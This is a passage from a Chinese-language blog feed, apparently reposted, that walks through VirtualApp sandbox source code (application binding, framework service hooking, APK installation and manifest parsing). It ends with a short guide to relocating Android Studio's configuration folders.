data.appInfo.targetSdkVersion);</span><br><span class="line"></span><br><span class="line">    boolean conflict = SpecialComponentList.isConflictingInstrumentation(packageName);</span><br><span class="line">    if (!conflict) &#123;</span><br><span class="line">        InvocationStubManager.getInstance().checkEnv(AppInstrumentation.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 开始构建子程序包的 Application 对象，并且替换原来通过 Host Stub 生成的 mInitialApplication</span><br><span class="line">    mInitialApplication = LoadedApk.makeApplication.call(data.info, false, null);</span><br><span class="line">    mirror.android.app.ActivityThread.mInitialApplication.set(mainThread, mInitialApplication);</span><br><span class="line">    ContextFixer.fixContext(mInitialApplication);</span><br><span class="line">    if (data.providers != null) &#123;</span><br><span class="line">        // 注册 Providers</span><br><span class="line">        installContentProviders(mInitialApplication, data.providers);</span><br><span class="line">    &#125;</span><br><span class="line">    // 初始化锁开，异步调用的初始化函数可以返回了</span><br><span class="line">    if (lock != null) &#123;</span><br><span class="line">        lock.open();</span><br><span class="line">        mTempLock = null;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 调用 Application.onCreate</span><br><span class="line">        mInstrumentation.callApplicationOnCreate(mInitialApplication);</span><br><span class="line">        InvocationStubManager.getInstance().checkEnv(HCallbackStub.class);</span><br><span class="line">        if (conflict) &#123;</span><br><span class="line">            InvocationStubManager.getInstance().checkEnv(AppInstrumentation.class);</span><br><span class="line">        &#125;</span><br><span class="line">        Application createdApp = ActivityThread.mInitialApplication.get(mainThread);</span><br><span class="line">        if (createdApp != null) &#123;</span><br><span class="line">            mInitialApplication = createdApp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        if (!mInstrumentation.onException(mInitialApplication, e)) &#123;</span><br><span class="line">            throw new RuntimeException(</span><br><span class="line">                    &quot;Unable to create application &quot; + mInitialApplication.getClass().getName()</span><br><span class="line">                            + &quot;: &quot; + e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VActivityManager.get().appDoneExecuting();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void setupUncaughtHandler() &#123;</span><br><span class="line">    ThreadGroup root = Thread.currentThread().getThreadGroup();</span><br><span class="line">    while (root.getParent() != null) &#123;</span><br><span class="line">        root = root.getParent();</span><br><span class="line">    &#125;</span><br><span class="line">    ThreadGroup newRoot = new RootThreadGroup(root);</span><br><span class="line">    if (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.N) &#123;</span><br><span class="line">        final List&lt;ThreadGroup&gt; groups = mirror.java.lang.ThreadGroup.groups.get(root);</span><br><span class="line">        //noinspection SynchronizationOnLocalVariableOrMethodParameter</span><br><span class="line">        synchronized (groups) &#123;</span><br><span class="line">            List&lt;ThreadGroup&gt; newGroups = new ArrayList&lt;&gt;(groups);</span><br><span class="line">            newGroups.remove(newRoot);</span><br><span class="line">            mirror.java.lang.ThreadGroup.groups.set(newRoot, newGroups);</span><br><span class="line">            groups.clear();</span><br><span class="line">            groups.add(newRoot);</span><br><span class="line">            mirror.java.lang.ThreadGroup.groups.set(root, groups);</span><br><span class="line">            for (ThreadGroup group : newGroups) &#123;</span><br><span class="line">                mirror.java.lang.ThreadGroup.parent.set(group, newRoot);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        final ThreadGroup[] groups = ThreadGroupN.groups.get(root);</span><br><span class="line">        //noinspection SynchronizationOnLocalVariableOrMethodParameter</span><br><span class="line">        synchronized (groups) &#123;</span><br><span class="line">            ThreadGroup[] newGroups = groups.clone();</span><br><span class="line">            ThreadGroupN.groups.set(newRoot, newGroups);</span><br><span class="line">            ThreadGroupN.groups.set(root, new ThreadGroup[]&#123;newRoot&#125;);</span><br><span class="line">            for (Object group : newGroups) &#123;</span><br><span class="line">                ThreadGroupN.parent.set(group, newRoot);</span><br><span class="line">            &#125;</span><br><span class="line">            ThreadGroupN.ngroups.set(root, 1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>bindApplication</code> 主要做了以下几个事情：</p>
<ol>
<li>从 <code>VPMS</code> 获取 <code>APK</code> 的信息，根据设置控制 <code>Dex</code> 优化的开关。</li>
<li>调用 <code>mirror.android.os.Process.setArgV0.call(processName);</code> 设置进程的名称，如果不设置则还是 <code>p0 p1</code> 这样。</li>
<li>做 <code>nativeHook</code> 主要 <code>Hook</code> 一些 <code>native</code> 的函数，主要是一些 <code>IO</code> 函数，包括文件访问重定向等等。</li>
<li>准备一些 <code>cache</code> 临时文件夹。</li>
<li>设置 <code>AppBinderData</code> ， <code>AppBinderData</code> 内部包含了 <code>ApplicationInfo</code> 和 <code>provider</code> 信息等重要的 <code>apk</code> 信息。可以理解为 <code>framework</code> 所需要的关键数据结构。</li>
<li>安装 <code>ContentProvider</code> 。</li>
<li>初始化用户的 <code>Application</code> 对象，并通过 <code>Instrumentation</code> 调用其 <code>onCreate</code> ，代表着 <code>Client App</code> 的生命周期正式开始。</li>
</ol>
<p>最后成功从 <code>StubActivity Intent</code> 还原出来的原版 <code>Intent</code> 被继续交给原生的 <code>AM</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 将 Host Stub Activity Intent 替换为原版 Intent</span><br><span class="line">ActivityThread.ActivityClientRecord.intent.set(r, intent);</span><br><span class="line">// 同上</span><br><span class="line">ActivityThread.ActivityClientRecord.activityInfo.set(r, info);</span><br></pre></td></tr></table></figure>

<p>最后，最后一个 <code>Hook</code> 点在 <code>Instrumentation.callActivityOnCreate</code> 。</p>
<p>因为 <code>AMS</code> 实际上启动的是 <code>StubActivity</code> 的关系，真正的 <code>Activity</code> 的一些信息还不是其真正的信息，比如主题之类的，所以需要在这个时机修复一下，选择这个时间修复的原因也是因为 <code>Activity</code> 已经被 <code>new</code> 出来了，而且资源已经准备完毕。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void callActivityOnCreate(Activity activity, Bundle icicle) &#123;</span><br><span class="line">    VirtualCore.get().getComponentDelegate().beforeActivityCreate(activity);</span><br><span class="line">    IBinder token = mirror.android.app.Activity.mToken.get(activity);</span><br><span class="line">    ActivityClientRecord r = VActivityManager.get().getActivityRecord(token);</span><br><span class="line">    // 替换 Activity 对象</span><br><span class="line">    if (r != null) &#123;</span><br><span class="line">        r.activity = activity;</span><br><span class="line">    &#125;</span><br><span class="line">    ContextFixer.fixContext(activity);</span><br><span class="line">    ActivityFixer.fixActivity(activity);</span><br><span class="line">    ActivityInfo info = null;</span><br><span class="line">    if (r != null) &#123;</span><br><span class="line">        info = r.info;</span><br><span class="line">    &#125;</span><br><span class="line">    // 设置主题和屏幕纵横控制</span><br><span class="line">    if (info != null) &#123;</span><br><span class="line">        if (info.theme != 0) &#123;</span><br><span class="line">            activity.setTheme(info.theme);</span><br><span class="line">        &#125;</span><br><span class="line">        if (activity.getRequestedOrientation() == ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED</span><br><span class="line">                &amp;&amp; info.screenOrientation != ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED) &#123;</span><br><span class="line">            activity.setRequestedOrientation(info.screenOrientation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    super.callActivityOnCreate(activity, icicle);</span><br><span class="line">    VirtualCore.get().getComponentDelegate().afterActivityCreate(activity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下一章介绍 <code>Service</code> 的代理。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>VirtualApp</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 双开沙箱 VirtualApp 源码分析（二）</title>
    <url>/2020/08/08/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>转载 : <a href="https://blog.csdn.net/ganyao939543405/article/details/76150725">https://blog.csdn.net/ganyao939543405/article/details/76150725</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#va-%E5%88%9D%E5%A7%8B%E5%8C%96">VA 初始化</a><ul>
<li><a href="#virtualcorestartup">VirtualCore.startup</a></li>
<li><a href="#invocationstubmanagerinjectinternal">InvocationStubManager.injectInternal</a></li>
</ul>
</li>
<li><a href="#client-app-%E7%9A%84%E5%AE%89%E8%A3%85">Client App 的安装</a><ul>
<li><a href="#virtualcoreinstallpackage">VirtualCore.installPackage</a></li>
<li><a href="#packageparserexparsepackage">PackageParserEx.parsePackage</a></li>
<li><a href="#vpackage">VPackage</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->


<h1 id="VA-初始化"><a href="#VA-初始化" class="headerlink" title="VA 初始化"></a>VA 初始化</h1><h2 id="VirtualCore-startup"><a href="#VirtualCore-startup" class="headerlink" title="VirtualCore.startup"></a>VirtualCore.startup</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void startup(Context context) throws Throwable &#123;</span><br><span class="line">    if (!isStartUp) &#123;</span><br><span class="line">        // 确保 MainThread</span><br><span class="line">        if (Looper.myLooper() != Looper.getMainLooper()) &#123;</span><br><span class="line">            throw new IllegalStateException(&quot;VirtualCore.startup() must called in main thread.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        VASettings.STUB_CP_AUTHORITY = context.getPackageName() + &quot;.&quot; + VASettings.STUB_DEF_AUTHORITY;</span><br><span class="line">        ServiceManagerNative.SERVICE_CP_AUTH = context.getPackageName() + &quot;.&quot; + ServiceManagerNative.SERVICE_DEF_AUTH;</span><br><span class="line">        this.context = context;</span><br><span class="line">        // 获取 ActivityThread 实例</span><br><span class="line">        mainThread = ActivityThread.currentActivityThread.call();</span><br><span class="line">        unHookPackageManager = context.getPackageManager();</span><br><span class="line">        hostPkgInfo = unHookPackageManager.getPackageInfo(context.getPackageName(), PackageManager.GET_PROVIDERS);</span><br><span class="line">        detectProcessType();</span><br><span class="line">        // hook 系统类</span><br><span class="line">        InvocationStubManager invocationStubManager = InvocationStubManager.getInstance();</span><br><span class="line">        invocationStubManager.init();</span><br><span class="line">        invocationStubManager.injectAll();</span><br><span class="line">        // 修复权限管理</span><br><span class="line">        ContextFixer.fixContext(context);</span><br><span class="line">        isStartUp = true;</span><br><span class="line">        if (initLock != null) &#123;</span><br><span class="line">            initLock.open();</span><br><span class="line">            initLock = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个 <code>VA</code> 会运行在四种进程, 分别是前面提到的 <code>VAService</code> 进程、<code>Client App</code> 进程、 <code>VA</code> 自身的 App 主进程、子进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">    * Process type</span><br><span class="line">    */</span><br><span class="line">private enum ProcessType &#123;</span><br><span class="line">    /**</span><br><span class="line">        * Server process</span><br><span class="line">        */</span><br><span class="line">    Server,</span><br><span class="line">    /**</span><br><span class="line">        * Virtual app process</span><br><span class="line">        */</span><br><span class="line">    VAppClient,</span><br><span class="line">    /**</span><br><span class="line">        * Main process</span><br><span class="line">        */</span><br><span class="line">    Main,</span><br><span class="line">    /**</span><br><span class="line">        * Child process</span><br><span class="line">        */</span><br><span class="line">    CHILD</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话， <code>Application</code> 就会被初始化多次，所以要在初始化的时候根据进程类型有选择的做对应的初始化工作。</p>
<h2 id="InvocationStubManager-injectInternal"><a href="#InvocationStubManager-injectInternal" class="headerlink" title="InvocationStubManager.injectInternal"></a>InvocationStubManager.injectInternal</h2><p>主要完成对 <code>Java</code> 层 <code>framework</code> 的 <code>Hook</code> ，将其定位到 <code>VA</code> 伪造 <code>VA framework</code> 上去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void injectInternal() throws Throwable &#123;</span><br><span class="line">    // VA 自身的 App 进程不需要 Hook</span><br><span class="line">    if (VirtualCore.get().isMainProcess()) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // VAService 需要 Hook AMS 和 PMS</span><br><span class="line">    if (VirtualCore.get().isServerProcess()) &#123;</span><br><span class="line">        addInjector(new ActivityManagerStub());</span><br><span class="line">        addInjector(new PackageManagerStub());</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // Client APP 需要 Hook 整个 framework，来使其调用到 VA framework</span><br><span class="line">    if (VirtualCore.get().isVAppProcess()) &#123;</span><br><span class="line">        addInjector(new LibCoreStub());</span><br><span class="line">        addInjector(new ActivityManagerStub());</span><br><span class="line">        addInjector(new PackageManagerStub());</span><br><span class="line">        addInjector(HCallbackStub.getDefault());</span><br><span class="line">        addInjector(new ISmsStub());</span><br><span class="line">        addInjector(new ISubStub());</span><br><span class="line">        addInjector(new DropBoxManagerStub());</span><br><span class="line">        addInjector(new NotificationManagerStub());</span><br><span class="line">        addInjector(new LocationManagerStub());</span><br><span class="line">        addInjector(new WindowManagerStub());</span><br><span class="line">        addInjector(new ClipBoardStub());</span><br><span class="line">        addInjector(new MountServiceStub());</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p><code>VA</code> 初始化主要就是这些。</p>
<h1 id="Client-App-的安装"><a href="#Client-App-的安装" class="headerlink" title="Client App 的安装"></a>Client App 的安装</h1><h2 id="VirtualCore-installPackage"><a href="#VirtualCore-installPackage" class="headerlink" title="VirtualCore.installPackage"></a>VirtualCore.installPackage</h2><p>首先调用远程 <code>VAService</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public InstallResult installPackage(String apkPath, int flags) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 调用远程 VAService</span><br><span class="line">        return getService().installPackage(apkPath, flags);</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">        return VirtualRuntime.crash(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终调用 <code>VAServcie</code> 中的 <code>VAppManagerService.installPackage()</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 安装 apk 先于 installPackageAsUser，主要目的是生成 VPackage 结构</span><br><span class="line">public synchronized InstallResult installPackage(String path, int flags, boolean notify) &#123;</span><br><span class="line">    long installTime = System.currentTimeMillis();</span><br><span class="line">    if (path == null) &#123;</span><br><span class="line">        return InstallResult.makeFailure(&quot;path = NULL&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 是否 OPT 优化(dex -&gt; binary)</span><br><span class="line">    boolean skipDexOpt = (flags &amp; InstallStrategy.SKIP_DEX_OPT) != 0;</span><br><span class="line">    // apk path</span><br><span class="line">    File packageFile = new File(path);</span><br><span class="line">    if (!packageFile.exists() || !packageFile.isFile()) &#123;</span><br><span class="line">        return InstallResult.makeFailure(&quot;Package File is not exist.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    VPackage pkg = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 进入解析包结构，该结构是可序列化的，为了持久化在磁盘上</span><br><span class="line">        pkg = PackageParserEx.parsePackage(packageFile);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    if (pkg == null || pkg.packageName == null) &#123;</span><br><span class="line">        return InstallResult.makeFailure(&quot;Unable to parse the package.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    InstallResult res = new InstallResult();</span><br><span class="line">    res.packageName = pkg.packageName;</span><br><span class="line">    // PackageCache holds all packages, try to check if we need to update.</span><br><span class="line">    VPackage existOne = PackageCacheManager.get(pkg.packageName);</span><br><span class="line">    PackageSetting existSetting = existOne != null ? (PackageSetting) existOne.mExtras : null;</span><br><span class="line">    if (existOne != null) &#123;</span><br><span class="line">        if ((flags &amp; InstallStrategy.IGNORE_NEW_VERSION) != 0) &#123;</span><br><span class="line">            res.isUpdate = true;</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!canUpdate(existOne, pkg, flags)) &#123;</span><br><span class="line">            return InstallResult.makeFailure(&quot;Not allowed to update the package.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.isUpdate = true;</span><br><span class="line">    &#125;</span><br><span class="line">    // 获得 app 安装文件夹</span><br><span class="line">    File appDir = VEnvironment.getDataAppPackageDirectory(pkg.packageName);</span><br><span class="line">    // so 文件夹</span><br><span class="line">    File libDir = new File(appDir, &quot;lib&quot;);</span><br><span class="line">    if (res.isUpdate) &#123;</span><br><span class="line">        FileUtils.deleteDir(libDir);</span><br><span class="line">        VEnvironment.getOdexFile(pkg.packageName).delete();</span><br><span class="line">        VActivityManagerService.get().killAppByPkg(pkg.packageName, VUserHandle.USER_ALL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!libDir.exists() &amp;&amp; !libDir.mkdirs()) &#123;</span><br><span class="line">        return InstallResult.makeFailure(&quot;Unable to create lib dir.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 是否基于系统的 apk 加载，前提是安装过的 apk 并且 dependSystem 开关打开</span><br><span class="line">    boolean dependSystem = (flags &amp; InstallStrategy.DEPEND_SYSTEM_IF_EXIST) != 0</span><br><span class="line">            &amp;&amp; VirtualCore.get().isOutsideInstalled(pkg.packageName);</span><br><span class="line"></span><br><span class="line">    if (existSetting != null &amp;&amp; existSetting.dependSystem) &#123;</span><br><span class="line">        dependSystem = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // 复制 so 到 sandbox lib</span><br><span class="line">    NativeLibraryHelperCompat.copyNativeBinaries(new File(path), libDir);</span><br><span class="line"></span><br><span class="line">    // 如果不基于系统，一些必要的拷贝工作</span><br><span class="line">    if (!dependSystem) &#123;</span><br><span class="line">        File privatePackageFile = new File(appDir, &quot;base.apk&quot;);</span><br><span class="line">        File parentFolder = privatePackageFile.getParentFile();</span><br><span class="line">        if (!parentFolder.exists() &amp;&amp; !parentFolder.mkdirs()) &#123;</span><br><span class="line">            VLog.w(TAG, &quot;Warning: unable to create folder : &quot; + privatePackageFile.getPath());</span><br><span class="line">        &#125; else if (privatePackageFile.exists() &amp;&amp; !privatePackageFile.delete()) &#123;</span><br><span class="line">            VLog.w(TAG, &quot;Warning: unable to delete file : &quot; + privatePackageFile.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            FileUtils.copyFile(packageFile, privatePackageFile);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            privatePackageFile.delete();</span><br><span class="line">            return InstallResult.makeFailure(&quot;Unable to copy the package file.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        packageFile = privatePackageFile;</span><br><span class="line">    &#125;</span><br><span class="line">    if (existOne != null) &#123;</span><br><span class="line">        PackageCacheManager.remove(pkg.packageName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 给上可执行权限，5.0 之后在 SD 卡上执行 bin 需要可执行权限</span><br><span class="line">    chmodPackageDictionary(packageFile);</span><br><span class="line"></span><br><span class="line">    // PackageSetting 的一些配置，后面会序列化在磁盘上</span><br><span class="line">    PackageSetting ps;</span><br><span class="line">    if (existSetting != null) &#123;</span><br><span class="line">        ps = existSetting;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ps = new PackageSetting();</span><br><span class="line">    &#125;</span><br><span class="line">    ps.skipDexOpt = skipDexOpt;</span><br><span class="line">    ps.dependSystem = dependSystem;</span><br><span class="line">    ps.apkPath = packageFile.getPath();</span><br><span class="line">    ps.libPath = libDir.getPath();</span><br><span class="line">    ps.packageName = pkg.packageName;</span><br><span class="line">    ps.appId = VUserHandle.getAppId(mUidSystem.getOrCreateUid(pkg));</span><br><span class="line">    if (res.isUpdate) &#123;</span><br><span class="line">        ps.lastUpdateTime = installTime;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ps.firstInstallTime = installTime;</span><br><span class="line">        ps.lastUpdateTime = installTime;</span><br><span class="line">        for (int userId : VUserManagerService.get().getUserIds()) &#123;</span><br><span class="line">            boolean installed = userId == 0;</span><br><span class="line">            ps.setUserState(userId, false/*launched*/, false/*hidden*/, installed);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //保存 VPackage Cache 到 Disk</span><br><span class="line">    PackageParserEx.savePackageCache(pkg);</span><br><span class="line">    //保存到 RamCache</span><br><span class="line">    PackageCacheManager.put(pkg, ps);</span><br><span class="line">    mPersistenceLayer.save();</span><br><span class="line">    BroadcastSystem.get().startApp(pkg);</span><br><span class="line">    //发送通知 安装完成</span><br><span class="line">    if (notify) &#123;</span><br><span class="line">        notifyAppInstalled(ps, -1);</span><br><span class="line">    &#125;</span><br><span class="line">    res.isSuccess = true;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>APK 的安装主要完成以下几件事情:</p>
<ol>
<li>解析 <code>menifest</code> 拿到 <code>apk</code> 内部信息，包括组件信息，权限信息等。并将这些信息序列化到磁盘和内存中，以备打开时调用。</li>
<li>准备 <code>App</code> 在 <code>VA</code> 沙箱环境中的私有空间，并且复制一些必要的 <code>apk</code> 和 <code>so libs</code>。</li>
<li>最后通知前台安装完成。</li>
</ol>
<h2 id="PackageParserEx-parsePackage"><a href="#PackageParserEx-parsePackage" class="headerlink" title="PackageParserEx.parsePackage"></a>PackageParserEx.parsePackage</h2><p>解析 <code>apk menifest</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 解析包结构</span><br><span class="line">public static VPackage parsePackage(File packageFile) throws Throwable &#123;</span><br><span class="line">    PackageParser parser = PackageParserCompat.createParser(packageFile);</span><br><span class="line">    // 调用对应系统版本的 parsePackage 方法</span><br><span class="line">    PackageParser.Package p = PackageParserCompat.parsePackage(parser, packageFile, 0);</span><br><span class="line">    // 包含此信息代表其是 debug 签名或者其他签名</span><br><span class="line">    if (p.requestedPermissions.contains(&quot;android.permission.FAKE_PACKAGE_SIGNATURE&quot;)</span><br><span class="line">            &amp;&amp; p.mAppMetaData != null</span><br><span class="line">            &amp;&amp; p.mAppMetaData.containsKey(&quot;fake-signature&quot;)) &#123;</span><br><span class="line">        String sig = p.mAppMetaData.getString(&quot;fake-signature&quot;);</span><br><span class="line">        p.mSignatures = new Signature[]&#123;new Signature(sig)&#125;;</span><br><span class="line">        VLog.d(TAG, &quot;Using fake-signature feature on : &quot; + p.packageName);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 验证签名</span><br><span class="line">        PackageParserCompat.collectCertificates(parser, p, PackageParser.PARSE_IS_SYSTEM);</span><br><span class="line">    &#125;</span><br><span class="line">    // 转换成可以序列化在磁盘上的 Cache</span><br><span class="line">    return buildPackageCache(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里解析 <code>Menifest</code> 的方法其实是调用了 <code>framework</code> 隐藏方法 <code>android.content.pm.PackageParser.parsePackage</code> 来实现的，这个方法返回 <code>android.content.pm.Package</code> 结构，这个类型也是隐藏的，怎么办？可以从 <code>sdk</code> 中复制这个类到自己的项目中欺骗编译器。这就是上一章一开始提到的。</p>
<p>这里还有一个问题，就是 <code>Package</code> 类是不可序列化的，换句话说就是不能直接保存在磁盘上，我们需要将其转换成可以序列化的 <code>VPackage</code> 类型，这就是 <code>buildPackageCache()</code> 的作用。</p>
<h2 id="VPackage"><a href="#VPackage" class="headerlink" title="VPackage"></a>VPackage</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class VPackage implements Parcelable &#123;</span><br><span class="line"></span><br><span class="line">    public static final Creator&lt;VPackage&gt; CREATOR = new Creator&lt;VPackage&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public VPackage createFromParcel(Parcel source) &#123;</span><br><span class="line">            return new VPackage(source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public VPackage[] newArray(int size) &#123;</span><br><span class="line">            return new VPackage[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    public ArrayList&lt;ActivityComponent&gt; activities;</span><br><span class="line">    public ArrayList&lt;ActivityComponent&gt; receivers;</span><br><span class="line">    public ArrayList&lt;ProviderComponent&gt; providers;</span><br><span class="line">    public ArrayList&lt;ServiceComponent&gt; services;</span><br><span class="line">    public ArrayList&lt;InstrumentationComponent&gt; instrumentation;</span><br><span class="line">    public ArrayList&lt;PermissionComponent&gt; permissions;</span><br><span class="line">    public ArrayList&lt;PermissionGroupComponent&gt; permissionGroups;</span><br><span class="line">    public ArrayList&lt;String&gt; requestedPermissions;</span><br><span class="line">    public ArrayList&lt;String&gt; protectedBroadcasts;</span><br><span class="line">    public ApplicationInfo applicationInfo;</span><br><span class="line">    public Signature[] mSignatures;</span><br><span class="line">    public Bundle mAppMetaData;</span><br><span class="line">    public String packageName;</span><br><span class="line">    public int mPreferredOrder;</span><br><span class="line">    public String mVersionName;</span><br><span class="line">    public String mSharedUserId;</span><br><span class="line">    public ArrayList&lt;String&gt; usesLibraries;</span><br><span class="line">    public int mVersionCode;</span><br><span class="line">    public int mSharedUserLabel;</span><br><span class="line">    // Applications hardware preferences</span><br><span class="line">    public ArrayList&lt;ConfigurationInfo&gt; configPreferences = null;</span><br><span class="line">    // Applications requested features</span><br><span class="line">    public ArrayList&lt;FeatureInfo&gt; reqFeatures = null;</span><br><span class="line">    public Object mExtras;</span><br><span class="line"></span><br><span class="line">    public VPackage() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>VPackage</code> 几乎保存了 <code>apk</code> 中所有的关键信息，尤其是组件的数据结构会在 <code>app</code> 在 <code>VA</code> 中运行的时候给 <code>VAMS</code> 、 <code>VPMS</code> 这些 <code>VAService</code> 提供 <code>apk</code> 的组件信息。</p>
<p>关于是否 <code>dependSystem</code> 和 <code>isInstallOutside</code> ，这个有关 <code>apk</code> 的动态加载，如果 <code>dependSysytem</code> 并且 <code>apk</code> 已经在外部环境安装了，那么 <code>VA</code> 会调用系统提供的 <code>API</code> 就可以动态加载 <code>APK</code> 。反之 <code>VA</code> 需要做一些必要的复制工作然后再费劲的去加载 <code>APK</code> 。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>VirtualApp</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidStudio环境配置</title>
    <url>/2022/05/30/AndroidStudio%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="Android-Studio-修改-android-gradle-AndroidStudio-文件夹位置"><a href="#Android-Studio-修改-android-gradle-AndroidStudio-文件夹位置" class="headerlink" title="Android Studio 修改 .android .gradle .AndroidStudio 文件夹位置"></a>Android Studio 修改 <code>.android</code> <code>.gradle</code> <code>.AndroidStudio</code> 文件夹位置</h1><h2 id="android-文件夹的修改"><a href="#android-文件夹的修改" class="headerlink" title=".android 文件夹的修改"></a><code>.android</code> 文件夹的修改</h2><p>首先，需要添加一个系统的环境变量 <code>ANDROID_SDK_HOME</code> 模拟器环境变量</p>
<p>默认情况下，模拟器会将配置文件存储在 <code>$HOME/.android/</code> 下，将 AVD 数据存储在 <code>$HOME/.android/avd/</code> 下。您可以通过设置以下环境变量来替换默认设置。</p>
<table>
<thead>
<tr>
<th>ANDROID_EMULATOR_HOME</th>
<th>设置特定于用户的模拟器配置目录的路径。默认位置是 <code>$ANDROID_SDK_HOME/.android/</code>。</th>
</tr>
</thead>
<tbody><tr>
<td>ANDROID_AVD_HOME</td>
<td>设置包含所有 AVD 特定文件的目录的路径，这些文件大多由非常大的磁盘映像组成。默认位置是 <code>$ANDROID_EMULATOR_HOME/avd/</code>。如果默认位置的磁盘空间不足，您可能需要指定新位置。</td>
</tr>
</tbody></table>
<h2 id="Gradle-文件夹的修改"><a href="#Gradle-文件夹的修改" class="headerlink" title=".Gradle 文件夹的修改"></a><code>.Gradle</code> 文件夹的修改</h2><p>首先，需要添加一个系统的环境变量 <code>GRADLE_USER_HOME</code> ，然后进入 <code>Android Studio -&gt; File -&gt; Settings -&gt; Gradle</code> 设置好路径即可。</p>
<h2 id="AndroidStudio文件夹的修改"><a href="#AndroidStudio文件夹的修改" class="headerlink" title=".AndroidStudio文件夹的修改"></a><code>.AndroidStudio</code>文件夹的修改</h2><p>进入 Android Studio 的安装目录，进入 bin 文件夹，用文本编辑软件打开 <code>idea.properties</code>，去掉以下两项的注释符号 #，修改对应的路径为新路径即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># idea.config.path=$&#123;user.home&#125;/.AndroidStudio/config</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># idea.system.path=$&#123;user.home&#125;/.AndroidStudio/system</span></span><br></pre></td></tr></table></figure>

<p>参考：<br><a href="https://juejin.cn/post/6967215049446260772">https://juejin.cn/post/6967215049446260772</a></p>
<p><a href="https://developer.android.com/studio/command-line/variables?hl=zh-cn">https://developer.android.com/studio/command-line/variables?hl=zh-cn</a></p>
<p><a href="https://docs.gradle.org/current/userguide/build_environment.html">https://docs.gradle.org/current/userguide/build_environment.html</a></p>
